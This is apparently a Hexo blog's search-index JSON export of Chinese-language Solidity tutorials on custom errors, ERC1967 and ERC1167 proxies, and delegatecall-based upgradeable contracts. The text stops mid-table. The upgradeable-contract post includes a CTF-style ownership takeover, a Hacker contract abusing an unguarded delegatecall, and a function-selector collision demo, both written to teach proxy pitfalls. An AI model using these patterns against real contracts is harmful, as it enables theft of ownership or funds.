{"meta":{"title":"BY_DLIFE🍉","subtitle":"","description":"Self-Discipline","author":"BY_DLIFE🍉","url":"https://biyouqiuqiu.com","root":"/"},"pages":[{"title":"","date":"2024-04-12T05:59:50.608Z","updated":"2024-04-12T05:59:50.608Z","comments":true,"path":"about/index.html","permalink":"https://biyouqiuqiu.com/about/index.html","excerpt":"","text":"111111"},{"title":"Proxy_article","date":"2023-07-24T01:47:10.000Z","updated":"2023-07-24T01:47:10.000Z","comments":true,"path":"resource/Proxy_article.html","permalink":"https://biyouqiuqiu.com/resource/Proxy_article.html","excerpt":"","text":"1. Chainlink_article"},{"title":"所有分类","date":"2023-05-31T23:45:51.441Z","updated":"2023-05-31T23:45:51.441Z","comments":true,"path":"categories/index.html","permalink":"https://biyouqiuqiu.com/categories/index.html","excerpt":"","text":""},{"title":"资源","date":"2024-04-12T06:05:12.810Z","updated":"2024-04-12T06:05:12.810Z","comments":true,"path":"resource/index.html","permalink":"https://biyouqiuqiu.com/resource/index.html","excerpt":"","text":""}],"posts":[{"title":"solidity扫盲","slug":"Basic_Knowledge/solidity/知识扫盲","date":"2024-02-27T00:47:10.000Z","updated":"2024-02-27T00:47:10.000Z","comments":true,"path":"2024/02/27/Basic_Knowledge/solidity/知识扫盲/","link":"","permalink":"https://biyouqiuqiu.com/2024/02/27/Basic_Knowledge/solidity/%E7%9F%A5%E8%AF%86%E6%89%AB%E7%9B%B2/","excerpt":"","text":"1. 自定义错误类型这是在solidity 0.8.4新加的内容，方便且高效（省gas）地向用户解释操作失败的原因，同时还可以在抛出异常的同时携带参数，帮助开发者更好地调试。 在执行中，error必须搭配revert使用。 自定义错误： 1error InsufficientBalance(address requested, uint256 available); 两种调用方式： 123456function send1(address payable to, uint256 amount) public &#123; if (address(this).balance &lt; amount) &#123; revert InsufficientBalance(&#123;requested: to, available: amount&#125;); &#125; to.call&#123;value: amount&#125;(&quot;&quot;);&#125; 123456function send2(address payable to, uint256 amount) public &#123; if (address(this).balance &lt; amount) &#123; revert InsufficientBalance(to, amount); &#125; to.call&#123;value: amount&#125;(&quot;&quot;);&#125; 2. 辅助函数这是一种定义在合约之外的一种函数，没有public，private，internal，external这些关键词修饰。调用的方式为：直接通过函数名调用即可。 示例： 12345678910111213// 定义在合约之外的辅助函数function helper(uint x) pure returns (uint) &#123; return x * 2;&#125;contract Test &#123; uint256 public a = 1; function test() public &#123; a = helper(a) &lt;&lt; 3; &#125;&#125; 调用一次test()函数之后，a的值应该变成16。 3. uint和bytes的截取方式以转address类型为例： 如果使用较大字节的类型转换为 address，例如 bytes32，那么 address 就被截断了。 为了减少转换的模糊性，从 0.4.24 版本开始，编译器将强迫在转换中明确地进行截断处理。以32字节的值 0x111122333344556677888899AAAABBBBCCCCDDDDEEFFFFCCCC 为例。 可以使用 address(uint160(bytes20(b)))，结果是 0x111122223333444455556666777788889999aAaa， 或者可以使用 address(uint160(uint256(b)))，结果是 0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc。 4. 分清callersolidity官方文档上，有这样一段话： 所有这些函数都是低级别的函数，应该谨慎使用。 具体来说，任何未知的合约都可能是恶意的，如果您调用它， 您就把控制权交给了该合约，而该合约又可能回调到您的合约中， 所以要准备好在调用返回时改变您合约的状态变量。 与其他合约互动的常规方法是在合约对象上调用一个函数（ x.f()）。 举例： 1234567891011121314151617181920212223242526272829contract DistinguishCaller &#123; // 该调用方式的caller, 为msg.sender function callCommon() public &#123; callFunc(); &#125; // 该调用方式的caller, 为address(this) function callLow() public &#123; bytes memory paylaod = abi.encodeWithSelector(this.callFunc.selector); (bool ok, ) = address(this).call(paylaod); require(ok); &#125; // 该调用方式的caller, 为address(this) function callThis() public &#123; this.callFunc(); &#125; function callFunc() public &#123; address caller = msg.sender; console.log(&quot;call=&gt;&quot;, caller); &#125;&#125; 5. 低版本发送gas和value1234// 调用外部合约函数// 这里一定需要带两个小括号，第一个括号填数值，第二个kcontract.function.gas()();contract.function.value()();","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"知识扫盲","slug":"知识扫盲","permalink":"https://biyouqiuqiu.com/tags/%E7%9F%A5%E8%AF%86%E6%89%AB%E7%9B%B2/"}]},{"title":"ERC1967","slug":"DEFI/ERC/ERC1967","date":"2024-01-26T04:00:00.000Z","updated":"2024-01-26T04:00:00.000Z","comments":true,"path":"2024/01/26/DEFI/ERC/ERC1967/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/26/DEFI/ERC/ERC1967/","excerpt":"","text":"1. ERC1967简介 该 EIP标准定义了一些存储插槽，用于存储代理合约信息，包括逻辑合约地址、信标合约地址和管理员地址。这些插槽的使用标准有助于监控代理的安全性，同时避免了代理和逻辑合约之间存储使用的冲突。 代理合约特别需要注意插槽冲突这个问题，而该标准就是想办法解决插槽冲突问题，它将合约地址、信标合约地址和管理员地址分别存放到指定位置存储位置上（比较往后靠），而将低端的存储（比如slot0，slot1…这些靠前的）位置让出来用来存放逻辑合约所需要的“加载数据”（比如变量啥的）。 2. 原理解释代码来源于：官方文档。 2.1 ERC1967Upgrade123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181/** * @dev This abstract contract provides getters and event emitting update functions for * https://eips.ethereum.org/EIPS/eip-1967[EIP1967] slots. */abstract contract ERC1967Upgrade &#123; // This is the keccak-256 hash of &quot;eip1967.proxy.rollback&quot; subtracted by 1 bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143; /** * @dev Storage slot with the address of the current implementation. * This is the keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1, and is * validated in the constructor. */ bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; /** * @dev Emitted when the implementation is upgraded. */ event Upgraded(address indexed implementation); /** * @dev Returns the current implementation address. */ function _getImplementation() internal view returns (address) &#123; return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value; &#125; /** * @dev Stores a new address in the EIP1967 implementation slot. */ function _setImplementation(address newImplementation) private &#123; require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;); StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation; &#125; /** * @dev Perform implementation upgrade * * Emits an &#123;Upgraded&#125; event. */ function _upgradeTo(address newImplementation) internal &#123; _setImplementation(newImplementation); emit Upgraded(newImplementation); &#125; /** * @dev Perform implementation upgrade with additional setup call. * * Emits an &#123;Upgraded&#125; event. */ function _upgradeToAndCall( address newImplementation, bytes memory data, bool forceCall ) internal &#123; _upgradeTo(newImplementation); if (data.length &gt; 0 || forceCall) &#123; Address.functionDelegateCall(newImplementation, data); &#125; &#125; /** * @dev Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. * * Emits an &#123;Upgraded&#125; event. */ function _upgradeToAndCallSecure( address newImplementation, bytes memory data, bool forceCall ) internal &#123; address oldImplementation = _getImplementation(); // Initial upgrade and setup call _setImplementation(newImplementation); if (data.length &gt; 0 || forceCall) &#123; Address.functionDelegateCall(newImplementation, data); &#125; // Perform rollback test if not already in progress StorageSlot.BooleanSlot storage rollbackTesting = StorageSlot.getBooleanSlot(_ROLLBACK_SLOT); if (!rollbackTesting.value) &#123; // Trigger rollback using upgradeTo from the new implementation rollbackTesting.value = true; Address.functionDelegateCall( newImplementation, abi.encodeWithSignature(&quot;upgradeTo(address)&quot;, oldImplementation) ); rollbackTesting.value = false; // Check rollback was effective require(oldImplementation == _getImplementation(), &quot;ERC1967Upgrade: upgrade breaks further upgrades&quot;); // Finally reset to the new implementation and log the upgrade _upgradeTo(newImplementation); &#125; &#125; /** * @dev Storage slot with the admin of the contract. * This is the keccak-256 hash of &quot;eip1967.proxy.admin&quot; subtracted by 1, and is * validated in the constructor. */ bytes32 internal constant _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103; /** * @dev Emitted when the admin account has changed. */ event AdminChanged(address previousAdmin, address newAdmin); /** * @dev Returns the current admin. */ function _getAdmin() internal view returns (address) &#123; return StorageSlot.getAddressSlot(_ADMIN_SLOT).value; &#125; /** * @dev Stores a new address in the EIP1967 admin slot. */ function _setAdmin(address newAdmin) private &#123; require(newAdmin != address(0), &quot;ERC1967: new admin is the zero address&quot;); StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin; &#125; /** * @dev Changes the admin of the proxy. * * Emits an &#123;AdminChanged&#125; event. */ function _changeAdmin(address newAdmin) internal &#123; emit AdminChanged(_getAdmin(), newAdmin); _setAdmin(newAdmin); &#125; /** * @dev The storage slot of the UpgradeableBeacon contract which defines the implementation for this proxy. * This is bytes32(uint256(keccak256(&#x27;eip1967.proxy.beacon&#x27;)) - 1)) and is validated in the constructor. */ bytes32 internal constant _BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50; /** * @dev Emitted when the beacon is upgraded. */ event BeaconUpgraded(address indexed beacon); /** * @dev Returns the current beacon. */ function _getBeacon() internal view returns (address) &#123; return StorageSlot.getAddressSlot(_BEACON_SLOT).value; &#125; /** * @dev Stores a new beacon in the EIP1967 beacon slot. */ function _setBeacon(address newBeacon) private &#123; require(Address.isContract(newBeacon), &quot;ERC1967: new beacon is not a contract&quot;); require( Address.isContract(IBeacon(newBeacon).implementation()), &quot;ERC1967: beacon implementation is not a contract&quot; ); StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon; &#125; /** * @dev Perform beacon upgrade with additional setup call. Note: This upgrades the address of the beacon, it does * not upgrade the implementation contained in the beacon (see &#123;UpgradeableBeacon-_setImplementation&#125; for that). * * Emits a &#123;BeaconUpgraded&#125; event. */ function _upgradeBeaconToAndCall( address newBeacon, bytes memory data, bool forceCall ) internal &#123; _setBeacon(newBeacon); emit BeaconUpgraded(newBeacon); if (data.length &gt; 0 || forceCall) &#123; Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data); &#125; &#125;&#125; 从代码中可以看到，逻辑合约地址、信标合约地址和管理员地址存储的插槽位于： 123keccak256(abi.encodePacked(&quot;eip1967.proxy.implementation&quot;)); keccak256(abi.encodePacked(&quot;eip1967.proxy.beacon&quot;));keccak256(abi.encodePacked(&quot;eip1967.proxy.admin&quot;)); 这些hash值的数值都是比较大的，要是按照变量从 slot0, slot1....这样慢慢存储数据到这几个特殊的位置，那几乎是不可能的因为，因为那么多的变量会使得合约的size会很大，从而无法部署合约。 ERC1967Upgrade合约中，可以看到_IMPLEMENTATION_SLOT是可见类型是internal的，用于继承。 _getImplementation是internal的用于继承，用来获取逻辑合约地址；_setImplementation则是给下一个函数_upgradeTo来调用的，用于设定新的逻辑合约地址。 这两个操作都使用了StorageSlot这个library，在合约下方给出了library StorageSlot这个库的代码，其定义了四种solot类型并且写了对应的getter方法。 _upgradeTo即用来做合约升级，主要就是设置了新的逻辑合约地址，发布了Upgrade的事件； _upgradeToAndCall顾名思义，即先做合约升级，再做delegatecall传入的bytes类型的data； _upgradeToAndCallSecure这个方法首先是给UUPSUpgradeable合约用的，在open zeppelin的github仓库中，这个方法是_upgradeToAndCallUUPS: 12345678910111213141516171819function _upgradeToAndCallUUPS( address newImplementation, bytes memory data, bool forceCall) internal &#123; // Upgrades from old implementations will perform a rollback test. This test requires the new // implementation to upgrade back to the old, non-ERC1822 compliant, implementation. Removing // this special case will break upgrade paths from old UUPS implementation to new ones. if (StorageSlot.getBooleanSlot(_ROLLBACK_SLOT).value) &#123; _setImplementation(newImplementation); &#125; else &#123; try IERC1822Proxiable(newImplementation).proxiableUUID() returns (bytes32 slot) &#123; require(slot == _IMPLEMENTATION_SLOT, &quot;ERC1967Upgrade: unsupported proxiableUUID&quot;); &#125; catch &#123; revert(&quot;ERC1967Upgrade: new implementation is not UUPS&quot;); &#125; _upgradeToAndCall(newImplementation, data, forceCall); &#125;&#125; _getAdmin、_setAdmin、_changeAdmin三个方法则是管理员相关信息；_getBeacon、_setBeacon、_changeBeacon三个方法则是给Beacon合约用的； 2.2 Proxy1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071abstract contract Proxy &#123; /** * @dev Delegates the current call to `implementation`. * * This function does not return to its internal call site, it will return directly to the external caller. */ function _delegate(address implementation) internal virtual &#123; assembly &#123; // Copy msg.data. We take full control of memory in this inline assembly // block because it will not return to Solidity code. We overwrite the // Solidity scratch pad at memory position 0. calldatacopy(0, 0, calldatasize()) // Call the implementation. // out and outsize are 0 because we don&#x27;t know the size yet. let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) // Copy the returned data. returndatacopy(0, 0, returndatasize()) switch result // delegatecall returns 0 on error. case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125; /** * @dev This is a virtual function that should be overridden so it returns the address to which the fallback function * and &#123;_fallback&#125; should delegate. */ function _implementation() internal view virtual returns (address); /** * @dev Delegates the current call to the address returned by `_implementation()`. * * This function does not return to its internal call site, it will return directly to the external caller. */ function _fallback() internal virtual &#123; _beforeFallback(); _delegate(_implementation()); &#125; /** * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other * function in the contract matches the call data. */ fallback() external payable virtual &#123; _fallback(); &#125; /** * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data * is empty. */ receive() external payable virtual &#123; _fallback(); &#125; /** * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback` * call, or as part of the Solidity `fallback` or `receive` functions. * * If overridden should call `super._beforeFallback()`. */ function _beforeFallback() internal virtual &#123;&#125;&#125; 这是一个对逻辑合约执行delegatecall调用的合约，通过回调函数执行 代理调用。如果代理调用有返回值，可以返回执行结果的返回值。 2.3 ERC1967Proxy12345678910111213141516171819202122232425/** * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an * implementation address that can be changed. This address is stored in storage in the location specified by * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn&#x27;t conflict with the storage layout of the * implementation behind the proxy. */contract ERC1967Proxy is Proxy, ERC1967Upgrade &#123; /** * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`. * * If `_data` is nonempty, it&#x27;s used as data in a delegate call to `_logic`. This will typically be an encoded * function call, and allows initializing the storage of the proxy like a Solidity constructor. */ constructor(address _logic, bytes memory _data) payable &#123; assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(&quot;eip1967.proxy.implementation&quot;)) - 1)); _upgradeToAndCall(_logic, _data, false); &#125; /** * @dev Returns the current implementation address. */ function _implementation() internal view virtual override returns (address impl) &#123; return ERC1967Upgrade._getImplementation(); &#125;&#125; ERC1967Proxy继承了Proxy和ERC1967Upgrade。 构造函数中，需要两个参数，_logic即是逻辑合约的地址，data是ecode的代码bytes，如果不为空的话，可用于_logic的delegatecall。构造函数中，首先是做了断言，确保基类合约ERC1967Upgrade中的_IMPLEMENTATION_SLOT常量为**the keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1**；然后就是执行了_upgradeToAndCall——这个函数同样来自于基类合约ERC1967Upgrade，就是用于_logic的delegatecall，可完成初始化操作。 _implementation函数就是获取到逻辑合约的地址，逻辑合约的地址藏在某个很大的数值索引_IMPLEMENTATION_SLOT指向的storage内存中。 3. 安全隐患那么问题来了，既然都知道 implementation.slot的存储位置在哪了，那么岂不是可以通过逻辑合约的某些操作从而覆盖掉代理合约的逻辑合约地址。 答案是肯定的，所以这里是需要注意的，看看逻辑合约中是否存在执行操作的代码。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1967","slug":"ERC1967","permalink":"https://biyouqiuqiu.com/tags/ERC1967/"}]},{"title":"ERC1167","slug":"DEFI/ERC/ERC1167","date":"2024-01-25T04:00:00.000Z","updated":"2024-01-25T04:00:00.000Z","comments":true,"path":"2024/01/25/DEFI/ERC/ERC1167/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/25/DEFI/ERC/ERC1167/","excerpt":"","text":"1. ERC1167 简介 EIP-1167，又称Minimal Proxy Contract，提供了一种低成本复制合约的方法，也可以叫作是克隆合约的方法。如何理解克隆呢？克隆就是类似复制的意思，这里的合约克隆是指：克隆合约和原合约具有相同的逻辑功能。而且创建克隆合约的成本比直接部署原合约低，部署克隆合约的前提是得有一个原件。 2. 原理复现2.1 工作原理一说到代理，首先就会想到代理合约，合约升级。但是ERC1167不是合约升级，它只是负责合约的调用转发。 可升级合约的代理合约架构： 整个架构中存在一个代理合约和多个逻辑合约，只有一套数据（即代理合约的数据），需要升级时则替换掉代理合约中的逻辑合约，而且同一时间只能存在一个逻辑合约。 Minimal Proxy Contract合约架构： 整个架构中存在多个代理合约和一个逻辑合约，有多套数据分别存储在不同的代理合约中，所有代理合约共享逻辑合约的执行逻辑，同一时间存在多个代理合约。Minimal Proxy Contract的原理就是将代理合约作为逻辑合约的复制品，各个代理合约存储各自的数据，需要多少份复制品就创建多少个代理合约。而代理合约本身只负责请求转发，因此其内容很少，从而耗费的gas就更少。 2.2 解析字节码从官方文档上可以看到这串字节码： 363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3，经过反编译之后： 123456789101112131415161718192021222324 0x0: CALLDATASIZE 0x1: RETURNDATASIZE 0x2: RETURNDATASIZE 0x3: CALLDATACOPY 0x4: RETURNDATASIZE 0x5: RETURNDATASIZE 0x6: RETURNDATASIZE 0x7: CALLDATASIZE 0x8: RETURNDATASIZE 0x9: PUSH20 0xbebebebebebebebebebebebebebebebebebebebe0x1e: GAS 0x1f: DELEGATECALL0x20: RETURNDATASIZE0x21: DUP3 0x22: DUP1 0x23: RETURNDATACOPY0x24: SWAP1 0x25: RETURNDATASIZE0x26: SWAP2 0x27: PUSH1 0x2b0x29: JUMPI 0x2a: REVERT 0x2b: JUMPDEST 0x2c: RETURN 这串字节码的执行的逻辑就是对 0xbebebebebebebebebebebebebebebebebebebebe地址执行delegatecall，如果调用失败则revert，如果调用成功则返回代理调用返回的结果。 可以自己用汇编语言写出来，returndata的部分可能不太对，但是大体逻辑是这样的。 12345678910111213assembly &#123; calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result // delegatecall returns 0 on error. case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125;&#125; 2.3 实现复制功能要如何实现克隆功能，可以参考openzeppelin官方的代码。 123456789101112131415161718function clone(address implementation, uint256 value) internal returns (address instance) &#123; if (address(this).balance &lt; value) &#123; revert Errors.InsufficientBalance(address(this).balance, value); &#125; /// @solidity memory-safe-assembly assembly &#123; // Stores the bytecode after address mstore(0x20, 0x5af43d82803e903d91602b57fd5bf3) // implementation address mstore(0x11, implementation) // Packs the first 3 bytes of the `implementation` address with the bytecode before the address. mstore(0x00, or(shr(0x88, implementation), 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000)) instance := create(value, 0x09, 0x37) &#125; if (instance == address(0)) &#123; revert Errors.FailedDeployment(); &#125;&#125; 直接看到汇编部分，三个mstore操作码的作用是拼接克隆合约的createionCode，拼接的结果： 10x3d602d80600a3d3981f3363d3d373d3d3d363d73 + implementation + 5af43d82803e903d91602b57fd5bf3 然后通过create操作码部署克隆合约。 演示： 12345678910111213141516171819202122232425262728293031323334// SPDX-License-Identifier: UNLICENSEDpragma solidity 0.8.22;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/Clones.sol&quot;;contract Demo &#123; uint256 public num; fallback() external payable &#123; ++num; &#125;&#125;contract Test &#123; uint256 public num; event result(uint256); function call(address cloner) public &#123; cloner.call(&quot;aaa&quot;); // call fallback() (, bytes memory _result) = cloner.call(abi.encodeWithSignature(&quot;num()&quot;)); emit result(abi.decode(_result, (uint256))); &#125;&#125;contract CloneLib &#123; using Clones for address; function clone(address implementation) public returns (address cloner)&#123; cloner = implementation.clone(); &#125;&#125; 先部署 Demo合约 部署CloneLib合约，并调用clone函数，并传入Demo合约地址 最后部署Test合约，并调用call函数，传入克隆地址 结果： 可以看到结果返回1，说明克隆成功。 同理，知道了克隆的逻辑，可以用另一种方式复现： 1234567891011121314151617contract Clone &#123; uint256 public num; event a(bytes); constructor(address implementation) &#123; bytes memory head = hex&quot;363d3d373d3d3d363d73&quot;; bytes memory tail = hex&quot;5af43d82803e903d91602b57fd5bf3&quot;; bytes memory runtimeCode = abi.encodePacked(head, implementation, tail); emit a(runtimeCode); assembly &#123; return(add(runtimeCode, 0x20), mload(runtimeCode)) &#125; &#125;&#125; solidity的智能合约执行的逻辑都是通过runtimeCode，而只要将合约runtimeCode部分的内容按克隆合约的逻辑编写，即照样也可以完成相同的要求。 执行操作相同，执行结果为： 3. 节省gas费用通过部署原合约和部署克隆合约所需的gas费的多少来判断 部署Demo所需的gas费用为：&quot;122325&quot; 部署克隆合约所需的gas费用为：&quot;63334&quot; 可以看到几乎是节省了一倍的花销。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1167","slug":"ERC1167","permalink":"https://biyouqiuqiu.com/tags/ERC1167/"}]},{"title":"Upgradeable Contract with delegatecall","slug":"DEFI/Proxy/深入可升级合约-代理篇","date":"2024-01-22T04:00:00.000Z","updated":"2024-01-22T04:00:00.000Z","comments":true,"path":"2024/01/22/DEFI/Proxy/深入可升级合约-代理篇/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/22/DEFI/Proxy/%E6%B7%B1%E5%85%A5%E5%8F%AF%E5%8D%87%E7%BA%A7%E5%90%88%E7%BA%A6-%E4%BB%A3%E7%90%86%E7%AF%87/","excerpt":"","text":"1. 前言 合约升级代理模式是通过 delegatecall操作码实现的，而这一操作码的特点便是，代码的数据来自于代理合约，执行逻辑来自于逻辑合约。同时正是由于这个特性容易引发插槽冲突问题。 delegatecall的使用方式就不多说了，不懂的可以去看看这篇文章。 先来简单了解一下什么是插槽冲突，这是 solidity CTF 最常见的一种考察方式。 举个最简单的例子： 123456789101112131415// SPDX-License-Identifier: MITpragma solidity ^0.8.20;contract Challenge &#123; address public owner; constructor() &#123; owner = msg.sender; &#125; function pwn(address hacker) external &#123; hacker.delegatecall(&quot;&quot;); &#125;&#125; 比如这道题，通过的条件是成为Challenge合约的所有者，熟悉delegatecall原理的很容易想到，可以利用合约执行的上下文在Challenge中，而执行的逻辑来自hacker地址。 因此，攻击合约可以这样写： 12345678contract Hacker &#123; address public addr; fallback() external &#123; addr = msg.sender; &#125;&#125; 复现： 部署Challege合约 切换EOA账户 部署Hacker合约 调用pwn()函数，并传入Hacker的地址 执行之后，可以看到owner的值已经发生了变化 画图理解： 简单来说，Hacker在回调函数中修改的owner其实是Challenge中的owner。因此插槽冲突就可以看作是，逻辑合约和代理合约中具有相同插槽位置的变量，可能会因为操作逻辑合约中的变量从而覆盖掉代理合约中的变量值。 2. 简单的可升级合约简单的可升级合约的实现原理是：部署一个代理合约，代理合约通过委托调用的形式去调用逻辑合约，如果要进行合约升级，只要将代理合约中的 实现合约（也叫逻辑合约）替换掉即可。需要注意的是：更换逻辑合约的函数需要有严格的访问控制，不能随便给其他人调用。 示意图： 2.1 复现可升级合约1234567891011121314151617181920212223242526// SPDX-License-Identifier: MITpragma solidity ^0.8.21;// 简单的可升级合约，管理员可以通过升级函数更改逻辑合约地址，从而改变合约的逻辑。contract SimpleUpgrade &#123; address public implementation; // 逻辑合约地址 address public admin; // admin地址 string public words; // 字符串，可以通过逻辑合约的函数改变 // 构造函数，初始化admin和逻辑合约地址 constructor(address _implementation)&#123; admin = msg.sender; implementation = _implementation; &#125; // fallback函数，将调用委托给逻辑合约 fallback() external payable &#123; (bool success, bytes memory data) = implementation.delegatecall(msg.data); &#125; // 升级函数，改变逻辑合约地址，只能由admin调用 function upgrade(address newImplementation) external &#123; require(msg.sender == admin); implementation = newImplementation; &#125;&#125; 这是一个简单的代理合约，构造函数初始化了admin以及implementation。 1234567891011contract Logic1 &#123; // 状态变量和proxy合约一致，防止插槽冲突 address public implementation; address public admin; string public words; // 字符串，可以通过逻辑合约的函数改变 // 改变proxy中状态变量，选择器： 0xc2985578 function foo() public&#123; words = &quot;old&quot;; &#125;&#125; 这是V1版本的逻辑合约，逻辑合约中很明显有两个“无用”的变量，为什么不直接删掉呢？ 答案：因为这是避免插槽冲突，前面我已经讲了。 1234567891011contract Logic2 &#123; // 状态变量和proxy合约一致，防止插槽冲突 address public implementation; address public admin; string public words; // 字符串，可以通过逻辑合约的函数改变 // 改变proxy中状态变量，选择器：0xc2985578 function foo() public&#123; words = &quot;new&quot;; &#125;&#125; 这是v2版本的逻辑合约，同样需要保证插槽的一致性。 复现逻辑： 部署Logic1合约。 部署SimpleUpgrade合约，传入Logic1的地址。 通过remix向可升级合约传入函数选择器。 可以看到words返回的结果是old。 进行合约升级，部署Logic2，让admin调用SimpleUpgrade合约的升级函数upgrade()。 再次通过remix向可升级合约传入函数选择器。 可以看到words返回的结果已经变成new了，说明合约升级成功。 注意：实际上这里需要有严格的访问控制，升级函数不能随意给他人调用。 2.2 缺陷2.2.1 插槽冲突和代码冗余123456|Proxy |Implementation ||--------------------------|-------------------------||address _implementation |address _owner | &lt;=== 插槽冲突|... |mapping _balances || |uint256 _supply || |... | 这类升级方式会存在插槽冲突，如果想要解决这个冲突问题，则必须要在逻辑合约中，严格按照代理合约中状态变量的声明顺序，在逻辑合约中重声一遍，以此来解决冲突问题。但是这样一来会造成代码冗余，而且在以太坊上的gas费用很贵，状态变量的存储方式为storage，占用一个槽的费用是20000gas，如果代理合约中的状态变量的数量很多，那么会导致升级的成本变得很高。 但是如果不声明这些变量，则会造成插槽冲突。 2.2.2 选择器碰撞先来了解一下什么是选择器碰撞。 都知道在智能合约的代码执行中，函数的调用是通过函数选择器来匹配的，如果说在代码中有两个函数的函数选择器是一样的，那么代码将无法找到msg.sender想要调用的函数，从而导致函数调用被revert()。 显然，在同一个合约中不可能出现两个函数选择器一样的函数，这是连编译都不能通过的。可代理模式不一样，代理合约和逻辑合约是分开的，就算他们之间存在“选择器冲突”也可以正常编译，这可能会导致很严重的安全事故。 例子：假如逻辑合约的 a函数和代理合约中的的升级函数选择器相同，那么管理人就会在调用a函数的时候，将代理合约升级成一个黑洞合约。 代码复现： 已知burn(uint256)和collate_propagate_storage(bytes16)函数的函数选择器都为0x42966c68。 假设代理合约的升级函数为burn(uint256)，此时合约管理人通过代理合约调用collate_propagate_storage(bytes16)函数，实际的执行并不会通过fallback()去委托调用，而是执行代理合约中的burn(uint256)。 12345678910111213141516171819202122232425262728293031323334353637// SPDX-License-Identifier: MITpragma solidity ^0.8.21;import &quot;hardhat/console.sol&quot;;contract SelectorCrash &#123; address public implementation; constructor(address _implementation)&#123; implementation = _implementation; &#125; fallback() external payable &#123; bytes memory _calldata = abi.encodeWithSignature(&quot;burn(uint256)&quot;, uint256(0)); (bool success, bytes memory data) = implementation.delegatecall(_calldata); &#125; function burn(uint256 num) external &#123; console.log(&quot;SelectorCrash Contract&quot;); &#125;&#125;contract Hacker &#123; function collate_propagate_storage(bytes16) external &#123; console.log(&quot;Hacker Contract&quot;); &#125;&#125;contract Test &#123; function test(address _crash) external &#123; (bool ok,) = _crash.call(abi.encodeWithSelector(Hacker.collate_propagate_storage.selector, bytes16(0))); console.log(&quot;ok=&gt;&quot;, ok); &#125;&#125; 代理合约的管理人通过Test合约调用collate_propagate_storag()函数，可以看到输出结果为： 也就是说明，被调用的函数是SelectorCrash合约中的burn(uint256)函数。 针对如上问题，现已有解决方法，解决方法如下： 3. EIP1967 proxy3.1 非结构化存储我之前有篇文章写过关于对 EIP1967的解读，感兴趣的可以去看看。 在学习该代理时，需要了解什么是非结构化存储。 上面已经说了 EVM存储数据的机制，也说了插槽冲突。 假设代理将逻辑合约的地址存储在其唯一变量 中address public _implementation;。现在，假设逻辑合约是一个基本代币，其第一个变量是address public _owner。这两个变量的大小均为 32 字节，据 EVM 所知，它们占据代理调用结果执行流的第一个槽。当逻辑合约写入 时_owner，它是在代理状态的范围内进行的，并且实际上写入的是_implementation。这个问题可以称为“存储冲突”。 123456|Proxy |Implementation ||--------------------------|-------------------------||address _implementation |address _owner | &lt;=== Slot collision!|... |mapping _balances || |uint256 _supply || |... | 有很多方法可以克服这个问题，OpenZeppelin Upgrades 实现的“非结构化存储”方法的工作原理如下。它没有将_implementation地址存储在代理的第一个存储槽中，而是选择伪随机槽。该槽足够随机，逻辑合约在同一槽声明变量的概率可以忽略不计。代理存储中的随机槽位置的相同原理也适用于代理可能具有的任何其他变量，例如管理地址（允许更新 的值_implementation）等。 12345678910111213|Proxy |Implementation 